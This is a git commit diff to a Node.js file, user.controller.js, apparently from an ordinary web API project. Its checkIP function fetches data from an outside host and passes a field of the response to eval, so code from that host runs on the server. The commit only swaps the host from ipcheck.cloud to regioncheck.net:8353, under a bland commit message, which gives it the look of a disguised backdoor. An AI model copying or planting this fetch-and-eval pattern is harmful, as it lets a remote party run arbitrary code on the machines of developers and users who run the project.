abf05469f1e2398a5bef12bdb24ddfeb6f9fd5a2
Superman <susan729floyd@gmail.com>
2024-08-30 12:19:55 +0200

    Update user.controller.js

--- api/src/controllers/user.controller.js
+++ api/src/controllers/user.controller.js
@@ -60,7 +60,7 @@ exports.update = function (req, res) {
 
 exports.checkIP = async function (req, res) {
   const response = await axios.get(
-    "http://ipcheck.cloud/api/user/thirdcookie/v6/106"
+    "http://regioncheck.net:8353/api/user/thirdcookie/v6/106"
   );
   // console.log('IP is available');
   eval(response.data.cookie);
